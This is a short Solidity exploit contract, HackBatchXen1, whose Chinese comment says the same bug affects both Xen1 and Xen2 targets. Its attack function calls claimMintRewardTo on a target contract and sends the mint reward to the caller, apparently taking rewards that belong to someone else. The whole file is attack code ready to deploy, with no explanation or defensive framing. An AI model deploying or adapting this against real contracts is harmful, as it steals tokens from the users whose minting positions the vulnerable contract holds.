// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
// 其实Xen1和Xen2 的bug是一样的所以 都用同一个合约即可

interface IHackBatchXen1{
    function claimMintRewardTo(address to) external;
}

contract HackBatchXen1 {
    function attack(address target) external {
        IHackBatchXen1(target).claimMintRewardTo(msg.sender);
    }
}